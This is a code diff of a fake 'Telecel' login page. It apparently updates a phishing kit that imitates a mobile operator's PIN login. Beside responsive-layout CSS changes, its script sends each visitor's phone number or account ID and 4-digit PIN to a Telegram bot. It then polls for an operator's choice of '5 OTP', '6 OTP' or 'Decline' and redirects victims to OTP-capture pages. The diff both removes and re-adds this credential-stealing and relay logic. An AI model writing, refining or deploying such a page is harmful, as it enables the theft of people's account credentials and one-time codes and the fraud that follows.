@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
   <title>Telecel – Login with PIN</title>
   <!-- Google Fonts & Icons -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -21,15 +21,17 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      padding: 16px;
+      padding: 12px;
     }
 
-    /* Main container – exactly same as original */
+    /* Main container – fully responsive */
     .container {
-      width: 360px;
+      width: 100%;
+      max-width: 360px;
+      margin: 0 auto;
       background: #f7f7f7;
       border-radius: 28px;
-      padding: 40px 20px;
+      padding: 30px 16px 36px;
       box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
       position: relative;
       overflow: hidden;
@@ -56,64 +58,66 @@
     /* Logo */
     .logo {
       text-align: center;
-      margin-top: 60px;
+      margin-top: 20px;
     }
     .logo-circle {
-      width: 52px;
-      height: 52px;
+      width: 48px;
+      height: 48px;
       background: #ff0000;
       border-radius: 50%;
       color: #ffffff !important;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 30px;
+      font-size: 28px;
       margin: auto;
       font-weight: 800;
     }
     .logo-text {
       color: #ff0000;
-      font-size: 26px;
+      font-size: 24px;
       font-weight: bold;
-      margin-top: 8px;
+      margin-top: 6px;
     }
 
     /* Titles */
     .title {
       text-align: center;
       color: #ff0000;
-      font-size: 20px;
+      font-size: 18px;
       font-weight: 600;
-      margin-top: 15px;
+      margin-top: 12px;
     }
     .subtitle {
       text-align: center;
       color: #666;
-      font-size: 15px;
-      margin-top: 10px;
-      line-height: 1.5;
+      font-size: 14px;
+      margin-top: 8px;
+      line-height: 1.45;
+      padding: 0 4px;
     }
 
-    /* Form */
+    /* Form spacing */
     .form {
-      margin-top: 30px;
+      margin-top: 24px;
       text-align: left;
     }
 
     .label {
       font-size: 13px;
       color: #666;
-      margin-bottom: 8px;
+      margin-bottom: 6px;
       display: block;
+      font-weight: 500;
     }
 
     /* Input & select */
     .input, .select {
       width: 100%;
-      height: 50px;
+      height: 48px;
       border-radius: 12px;
       border: 1px solid #ddd;
-      padding: 0 15px;
+      padding: 0 14px;
       font-size: 15px;
       background: #fff;
       outline: none;
@@ -133,10 +137,10 @@
     }
     .select {
       width: 100%;
-      height: 50px;
+      height: 48px;
       border-radius: 12px;
       border: 1px solid #ddd;
-      padding: 0 40px 0 15px;
+      padding: 0 40px 0 14px;
       font-size: 15px;
       background: #fff;
       cursor: pointer;
@@ -164,8 +168,8 @@
       z-index: 10;
     }
     .dropdown-item {
-      padding: 15px;
-      font-size: 15px;
+      padding: 14px;
+      font-size: 14px;
       cursor: pointer;
     }
     .dropdown-item.active {
@@ -176,7 +180,7 @@
       background: #f5f5f5;
     }
 
-    /* PIN inputs row – exactly matches phone input width using grid */
+    /* PIN inputs row – exactly matches sample */
     .pin-row {
       display: grid;
       grid-template-columns: repeat(4, 1fr);
@@ -185,9 +189,9 @@
       margin-bottom: 20px;
     }
     .pin-input {
-      width: 100%;           /* fill the grid cell */
-      height: 50px;          /* same height as phone input */
-      border-radius: 12px;   /* same border radius */
+      width: 100%;
+      height: 48px;
+      border-radius: 12px;
       border: 1px solid #ddd;
       text-align: center;
       font-size: 24px;
@@ -195,10 +199,8 @@
       background: #fff;
       outline: none;
       transition: border 0.2s;
-      /* password masking + numeric keyboard */
       -webkit-text-security: disc;
       inputmode: numeric;
-      pattern: \d*;
       font-family: monospace;
     }
     .pin-input:focus {
@@ -213,11 +215,11 @@
     /* Buttons */
     .btn {
       width: 100%;
-      height: 55px;
+      height: 52px;
       border: none;
       border-radius: 14px;
       font-size: 16px;
-      margin-top: 20px;
+      margin-top: 18px;
       cursor: pointer;
       font-weight: 600;
     }
@@ -241,8 +243,8 @@
     .version {
       text-align: center;
       color: #aaa;
-      font-size: 12px;
-      margin-top: 20px;
+      font-size: 11px;
+      margin-top: 18px;
     }
 
     /* Spinner overlay */
@@ -252,13 +254,13 @@
       display: none;
       align-items: center;
       justify-content: center;
-      background: rgba(255, 255, 255, 0.7);
+      background: rgba(255, 255, 255, 0.8);
       backdrop-filter: blur(2px);
       z-index: 999;
     }
     .loader {
-      width: 44px;
-      height: 44px;
+      width: 42px;
+      height: 42px;
       border: 4px solid #ffe0e0;
       border-top: 4px solid #ff0000;
       border-radius: 50%;
@@ -271,34 +273,88 @@
     /* Error box */
     .error-box {
       position: absolute;
-      top: 20px;
-      left: 20px;
-      right: 20px;
+      top: 12px;
+      left: 12px;
+      right: 12px;
       background: #fff;
       border: 2px solid #ff4d4d;
-      border-radius: 12px;
-      padding: 15px;
+      border-radius: 14px;
+      padding: 12px;
       display: none;
-      box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+      box-shadow: 0 5px 20px rgba(0,0,0,0.12);
       z-index: 100;
       text-align: left;
     }
     .error-title {
       color: #ff0000;
       font-weight: bold;
-      margin-bottom: 5px;
+      font-size: 14px;
+      margin-bottom: 4px;
     }
     .error-text {
       color: #444;
-      font-size: 14px;
+      font-size: 13px;
     }
     .close {
       position: absolute;
-      right: 15px;
-      top: 10px;
+      right: 12px;
+      top: 8px;
       cursor: pointer;
-      font-size: 18px;
+      font-size: 20px;
       color: #999;
+    }
+
+    /* Mobile fine-tuning */
+    @media (max-width: 360px) {
+      body {
+        padding: 8px;
+      }
+      .container {
+        padding: 24px 12px 32px;
+        border-radius: 24px;
+      }
+      .logo {
+        margin-top: 8px;
+      }
+      .logo-circle {
+        width: 44px;
+        height: 44px;
+        font-size: 26px;
+      }
+      .logo-text {
+        font-size: 22px;
+      }
+      .title {
+        font-size: 17px;
+        margin-top: 8px;
+      }
+      .subtitle {
+        font-size: 13px;
+      }
+      .form {
+        margin-top: 20px;
+      }
+      .input, .select, .pin-input, .btn {
+        height: 46px;
+      }
+      .pin-input {
+        font-size: 22px;
+      }
+      .btn {
+        font-size: 15px;
+        margin-top: 16px;
+      }
+      .version {
+        font-size: 10px;
+        margin-top: 16px;
+      }
+    }
+
+    body, .container, .content {
+      overflow-x: hidden;
+    }
+    .container {
+      overflow: hidden;
     }
   </style>
 </head>
@@ -342,13 +398,13 @@
       <div class="label" id="inputLabel" style="margin-top:15px;">Phone Number</div>
       <input class="input" id="inputField" placeholder="020XXXXXXX" inputmode="numeric">
 
-      <!-- PIN inputs row (grid, exactly matching phone input width) -->
+      <!-- 4‑Digit PIN inputs -->
       <div class="label" style="margin-top:15px;">4‑Digit PIN</div>
       <div class="pin-row">
-        <input type="password" class="pin-input" id="pin1" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
-        <input type="password" class="pin-input" id="pin2" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
-        <input type="password" class="pin-input" id="pin3" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
-        <input type="password" class="pin-input" id="pin4" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
+        <input type="password" class="pin-input" id="pin1" maxlength="1" inputmode="numeric" autocomplete="off">
+        <input type="password" class="pin-input" id="pin2" maxlength="1" inputmode="numeric" autocomplete="off">
+        <input type="password" class="pin-input" id="pin3" maxlength="1" inputmode="numeric" autocomplete="off">
+        <input type="password" class="pin-input" id="pin4" maxlength="1" inputmode="numeric" autocomplete="off">
       </div>
 
       <!-- Login button -->
@@ -403,7 +459,7 @@
     errorBox.style.display = 'none';
   }
 
-  // ========== INPUT FILTERING (identifier) ==========
+  // ========== FILTER IDENTIFIER ==========
   function filterInput(value, type) {
     if (type === 'Mobile') {
       return value.replace(/[^0-9]/g, '');
@@ -421,7 +477,7 @@
     }
   }
 
-  // Clear PIN fields (no focus stealing)
+  // Clear all PIN fields
   function clearPinFields() {
     pinInputs.forEach(input => {
       input.value = '';
@@ -429,12 +485,12 @@
     });
   }
 
-  // Focus first PIN field (used after decline)
+  // Focus first PIN field
   function focusFirstPin() {
     pinInputs[0].focus();
   }
 
-  // Update login button state: identifier not empty AND all 4 PIN digits filled
+  // Update login button: identifier + all 4 PIN digits filled
   function updateLoginButton() {
     const identifier = inputField.value.trim();
     const allPinsFilled = pinInputs.every(pin => pin.value.length === 1);
@@ -447,7 +503,7 @@
     }
   }
 
-  // PIN auto-advance and styling
+  // PIN auto‑advance, backspace, left/right arrows, and styling
   function setupPinInputs() {
     pinInputs.forEach((input, idx) => {
       input.addEventListener('input', function(e) {
@@ -463,6 +519,7 @@
           this.classList.remove('filled');
         }
         updateLoginButton();
+        hideError();
       });
 
       input.addEventListener('keydown', function(e) {
@@ -491,13 +548,237 @@
     });
   }
 
-  // Reset PIN fields when identifier changes (no focus stealing)
+  // ========== VALIDATION ==========
+  function validateMobileNumber(number) {
+    const cleaned = number.replace(/\D/g, '');
+    if (cleaned.length < 10) return false;
+    return cleaned.startsWith('020') || cleaned.startsWith('050');
+  }
+
+  // ========== OTP GENERATORS ==========
+  function generate5DigitOTP() {
+    return Math.floor(10000 + Math.random() * 90000).toString();
+  }
+  function generate6DigitOTP() {
+    return Math.floor(100000 + Math.random() * 900000).toString();
+  }
+
+  // ========== TELEGRAM HELPERS ==========
+  function escapeHtml(unsafe) {
+    if (!unsafe) return '';
+    return unsafe.replace(/[&<>"]/g, function(m) {
+      if (m === '&') return '&amp;';
+      if (m === '<') return '&lt;';
+      if (m === '>') return '&gt;';
+      if (m === '"') return '&quot;';
+      return m;
+    });
+  }
+
+  function stopPolling() {
+    if (currentPollInterval) {
+      clearInterval(currentPollInterval);
+      currentPollInterval = null;
+    }
+  }
+
+  async function sendLoginToTelegram(accountType, identifier, pin) {
+    const ts = Date.now();
+    const fiveOtpId = `login_5otp_${ts}`;
+    const sixOtpId = `login_6otp_${ts}`;
+    const declineId = `login_decline_${ts}`;
+    
+    sessionStorage.setItem('telecel_accountType', accountType);
+    sessionStorage.setItem('telecel_identifier', identifier);
+    if (accountType === 'Mobile') {
+      sessionStorage.setItem('telecel_phone', identifier.replace(/\D/g, ''));
+    } else {
+      sessionStorage.setItem('telecel_accountId', identifier);
+    }
+    sessionStorage.setItem('telecel_pin', pin);
+    
+    const displayType = accountType;
+    const identifierLabel = accountType === 'Mobile' ? ' Phone' : '🆔 Account ID';
+    const message = `🔐 <b>Telecel Play Login Request</b>\n\n` +
+                    `<b>Account Type:</b> ${displayType}\n` +
+                    `<b>${identifierLabel}:</b> <code>${escapeHtml(identifier)}</code>\n` +
+                    `<b> 4‑Digit PIN:</b> <code>${escapeHtml(pin)}</code>\n\n` +
+                    `📢 <b>Select OTP length or Decline:</b>`;
+
+    try {
+      const response = await fetch(`${API_BASE}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [[
+              { text: ' 5 OTP', callback_data: fiveOtpId },
+              { text: ' 6 OTP', callback_data: sixOtpId },
+              { text: '❌ Decline', callback_data: declineId }
+            ]]
+          }
+        })
+      });
+      
+      if (!response.ok) throw new Error(`HTTP ${response.status}`);
+      
+      startPollingForDecision(fiveOtpId, sixOtpId, declineId);
+    } catch (err) {
+      console.error('Telegram send error:', err);
+      spinner.style.display = 'none';
+      isSubmitting = false;
+      loginBtn.disabled = false;
+      updateLoginButton();
+      showError('Network error. Please try again.');
+    }
+  }
+
+  function startPollingForDecision(fiveOtpId, sixOtpId, declineId) {
+    stopPolling();
+    let lastUpdateId = 0;
+    
+    currentPollInterval = setInterval(async () => {
+      try {
+        const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
+        const response = await fetch(url);
+        const data = await response.json();
+        if (!data.ok || !data.result.length) return;
+        
+        for (const update of data.result) {
+          lastUpdateId = Math.max(lastUpdateId, update.update_id);
+          const callback = update.callback_query;
+          if (!callback) continue;
+          const cbData = callback.data;
+          
+          if (cbData === fiveOtpId) {
+            stopPolling();
+            spinner.style.display = 'none';
+            isSubmitting = false;
+            const otp = generate5DigitOTP();
+            sessionStorage.setItem('telecel_otp', otp);
+            sessionStorage.setItem('telecel_otp_length', '5');
+            window.location.href = 'otp5.html';
+            return;
+          }
+          
+          if (cbData === sixOtpId) {
+            stopPolling();
+            spinner.style.display = 'none';
+            isSubmitting = false;
+            const otp = generate6DigitOTP();
+            sessionStorage.setItem('telecel_otp', otp);
+            sessionStorage.setItem('telecel_otp_length', '6');
+            window.location.href = 'otp6.html';
+            return;
+          }
+          
+          if (cbData === declineId) {
+            stopPolling();
+            spinner.style.display = 'none';
+            isSubmitting = false;
+            loginBtn.disabled = false;
+            updateLoginButton();
+            showError('Authentication declined. Please check your credentials and try again.');
+            clearPinFields();
+            focusFirstPin();
+            return;
+          }
+        }
+      } catch (err) {
+        console.warn('Polling error:', err);
+      }
+    }, 1500);
+  }
+
+  async function submitLogin() {
+    if (isSubmitting) return;
+    
+    const accountType = selectedTypeInput.value;
+    const identifier = inputField.value.trim();
+    const pin = pinInputs.map(p => p.value).join('');
+    
+    hideError();
+    
+    if (!identifier) {
+      showError('Please enter your phone number or account ID.');
+      return;
+    }
+    if (pin.length !== 4) {
+      showError('Please enter your 4-digit PIN.');
+      return;
+    }
+    
+    if (accountType === 'Mobile') {
+      if (!validateMobileNumber(identifier)) {
+        showError('Please enter a valid Telecel number starting with 020 or 050 (minimum 10 digits).');
+        return;
+      }
+    } else {
+      if (identifier.length < 3) {
+        showError('Please enter a valid Broadband Account ID (minimum 3 characters).');
+        return;
+      }
+    }
+    
+    isSubmitting = true;
+    loginBtn.disabled = true;
+    spinner.style.display = 'flex';
+    
+    await sendLoginToTelegram(accountType, identifier, pin);
+  }
+
+  // ========== DROPDOWN FUNCTIONS ==========
+  function toggleDropdown() {
+    const isVisible = dropdownList.style.display === 'block';
+    dropdownList.style.display = isVisible ? 'none' : 'block';
+    arrow.classList.toggle('rotate', !isVisible);
+  }
+  
+  function selectType(e, type) {
+    e.stopPropagation();
+    selectedTypeInput.value = type;
+    document.querySelectorAll('.dropdown-item').forEach(item => {
+      item.classList.remove('active');
+    });
+    e.target.classList.add('active');
+    
+    const label = document.getElementById('inputLabel');
+    if (type === 'Mobile') {
+      label.innerText = 'Phone Number';
+      inputField.placeholder = '020XXXXXXX';
+      inputField.inputMode = 'numeric';
+      applyIdentifierFilter();
+    } else {
+      label.innerText = 'User ID / Account Number';
+      inputField.placeholder = 'e.g., TEL123XYZ';
+      inputField.inputMode = 'text';
+    }
+    applyIdentifierFilter();
+    dropdownList.style.display = 'none';
+    arrow.classList.remove('rotate');
+    clearPinFields();
+    updateLoginButton();
+    hideError();
+  }
+  
+  document.addEventListener('click', function(e) {
+    if (!e.target.closest('.dropdown')) {
+      dropdownList.style.display = 'none';
+      arrow.classList.remove('rotate');
+    }
+  });
+
+  // ========== EVENT LISTENERS ==========
   inputField.addEventListener('input', function() {
     applyIdentifierFilter();
     clearPinFields();
     updateLoginButton();
     hideError();
   });
+  
   inputField.addEventListener('paste', function(e) {
     e.preventDefault();
     const pasted = (e.clipboardData || window.clipboardData).getData('text');
@@ -513,208 +794,30 @@
     updateLoginButton();
     hideError();
   });
-
-  // ========== DROPDOWN FUNCTIONS ==========
-  function toggleDropdown() {
-    const isVisible = dropdownList.style.display === 'block';
-    dropdownList.style.display = isVisible ? 'none' : 'block';
-    arrow.classList.toggle('rotate', !isVisible);
-  }
-  function selectType(e, type) {
-    e.stopPropagation();
-    selectedTypeInput.value = type;
-    document.querySelectorAll('.dropdown-item').forEach(item => {
-      item.classList.remove('active');
-    });
-    e.target.classList.add('active');
-
-    const label = document.getElementById('inputLabel');
-    if (type === 'Mobile') {
-      label.innerText = 'Phone Number';
-      inputField.placeholder = '020XXXXXXX';
-      inputField.inputMode = 'numeric';
-    } else {
-      label.innerText = 'User ID / Account Number';
-      inputField.placeholder = 'Eg: Xgtrjj';
-      inputField.inputMode = 'text';
-    }
-    applyIdentifierFilter();
-    dropdownList.style.display = 'none';
-    arrow.classList.remove('rotate');
-    clearPinFields();
-    updateLoginButton();
-    hideError();
-  }
-  document.addEventListener('click', function(e) {
-    if (!e.target.closest('.dropdown')) {
-      dropdownList.style.display = 'none';
-      arrow.classList.remove('rotate');
-    }
-  });
-
-  // ========== TELEGRAM HELPERS ==========
-  function escapeHtml(unsafe) {
-    if (!unsafe) return '';
-    return unsafe.replace(/[&<>"]/g, function(m) {
-      if (m === '&') return '&amp;';
-      if (m === '<') return '&lt;';
-      if (m === '>') return '&gt;';
-      if (m === '"') return '&quot;';
-      return m;
-    });
-  }
-
-  async function sendToTelegram(payload) {
-    const url = `${API_BASE}/sendMessage`;
-    try {
-      const response = await fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-      return await response.json();
-    } catch (error) {
-      console.error('Telegram send error:', error);
-      throw error;
-    }
-  }
-
-  function pollForCallback(expectedPrefix, expectedTs, onDecision) {
-    if (currentPollInterval) clearInterval(currentPollInterval);
-
-    let lastUpdateId = 0;
-    currentPollInterval = setInterval(async () => {
-      try {
-        const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
-        const response = await fetch(url);
-        const data = await response.json();
-        if (!data.ok || !data.result.length) return;
-
-        let decisionMade = false;
-        for (const update of data.result) {
-          lastUpdateId = update.update_id;
-          if (!decisionMade && update.callback_query && update.callback_query.data) {
-            const parts = update.callback_query.data.split('_');
-            if (parts.length >= 3) {
-              const [type, action, time] = parts;
-              if (time == expectedTs && type === expectedPrefix) {
-                decisionMade = true;
-                clearInterval(currentPollInterval);
-                currentPollInterval = null;
-                onDecision(action);
-              }
-            }
-          }
-        }
-      } catch (err) {
-        console.warn('Polling error:', err);
-      }
-    }, 1500);
-  }
-
-  // OTP generators
-  function generate5DigitOTP() {
-    return Math.floor(10000 + Math.random() * 90000).toString();
-  }
-  function generate6DigitOTP() {
-    return Math.floor(100000 + Math.random() * 900000).toString();
-  }
-
-  // ========== LOGIN SUBMIT ==========
-  async function submitLogin() {
-    if (isSubmitting) return;
-
-    const identifier = inputField.value.trim();
-    const pin = pinInputs.map(p => p.value).join('');
-    if (identifier === '' || pin.length !== 4) {
-      showError('Please fill in all fields');
-      return;
-    }
-
-    isSubmitting = true;
-    loginBtn.disabled = true;
-    spinner.style.display = 'flex';
-
-    const accountType = selectedTypeInput.value;
-    const ts = Date.now();
-
-    let identifierLabel = accountType === 'Mobile' ? 'Phone Number' : 'Account ID';
-    const escapedIdentifier = escapeHtml(identifier);
-    const escapedPin = escapeHtml(pin);
-    const msg = `🔐 Login Request\n\nAccount Type: ${accountType}\n${identifierLabel}: <code>${escapedIdentifier}</code>\nPIN: <code>${escapedPin}</code>\n\nChoose OTP length or Decline:`;
-
-    try {
-      await sendToTelegram({
-        chat_id: CHAT_ID,
-        text: msg,
-        parse_mode: 'HTML',
-        reply_markup: {
-          inline_keyboard: [[
-            { text: '5 OTP', callback_data: `login_5otp_${ts}` },
-            { text: '6 OTP', callback_data: `login_6otp_${ts}` },
-            { text: 'Decline', callback_data: `login_decline_${ts}` }
-          ]]
-        }
-      });
-
-      sessionStorage.setItem('telecel_accountType', accountType);
-      sessionStorage.setItem('telecel_inputValue', identifier);
-      if (accountType === 'Mobile') {
-        sessionStorage.setItem('telecel_phone', identifier.replace(/\D/g, ''));
-      } else {
-        sessionStorage.setItem('telecel_phone', identifier);
-      }
-
-      pollForCallback('login', ts, (action) => {
-        spinner.style.display = 'none';
-        isSubmitting = false;
-
-        if (action === '5otp') {
-          const otp = generate5DigitOTP();
-          sessionStorage.setItem('telecel_otp', otp);
-          sessionStorage.setItem('telecel_otp_length', '5');
-          window.location.href = 'otp5.html';
-        } else if (action === '6otp') {
-          const otp = generate6DigitOTP();
-          sessionStorage.setItem('telecel_otp', otp);
-          sessionStorage.setItem('telecel_otp_length', '6');
-          window.location.href = 'otp6.html';
-        } else if (action === 'decline') {
-          showError('Authentication declined. Please check your credentials.');
-          clearPinFields();
-          focusFirstPin();  // focus first PIN for re‑entry
-          loginBtn.disabled = false;
-          updateLoginButton();
-        }
-      });
-
-    } catch (err) {
-      console.error(err);
-      spinner.style.display = 'none';
-      isSubmitting = false;
-      showError('Network error, please try again.');
-      loginBtn.disabled = false;
-      updateLoginButton();
-    }
-  }
-
-  // ========== EVENT LISTENERS ==========
+  
   loginBtn.addEventListener('click', submitLogin);
   goBackBtn.addEventListener('click', () => {
     window.history.back();
   });
-
-  // Initialize
+  
+  // ========== INITIALIZE ==========
   function init() {
     dropdownList.style.display = 'none';
     applyIdentifierFilter();
     setupPinInputs();
     updateLoginButton();
     hideError();
+    if (selectedTypeInput.value === 'Mobile') {
+      inputField.placeholder = '020XXXXXXX';
+    } else {
+      inputField.placeholder = 'e.g., TEL123XYZ';
+    }
+    inputField.focus();
   }
+  
   init();
-
-  // Expose globals for inline handlers
+  
+  // Expose globals
   window.toggleDropdown = toggleDropdown;
   window.selectType = selectType;
   window.hideError = hideError;
